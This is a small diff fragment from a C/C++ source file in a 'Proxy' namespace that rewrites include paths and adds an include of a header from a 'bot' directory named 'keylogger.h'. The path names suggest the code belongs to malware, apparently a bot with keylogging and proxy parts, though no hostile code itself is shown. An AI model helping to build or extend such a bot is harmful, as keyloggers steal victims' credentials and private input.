@@ -1,6 +1,8 @@
-#include "core\proxy.h"
-#include "core\socket.h"
-#include "core\debug.h"
+#include "../include/core/proxy.h"
+#include "../../bot/include/keylogger.h"
+//#include "core\proxy.h"
+//#include "core\socket.h"
+//#include "core\debug.h"
 
 namespace Proxy
 {
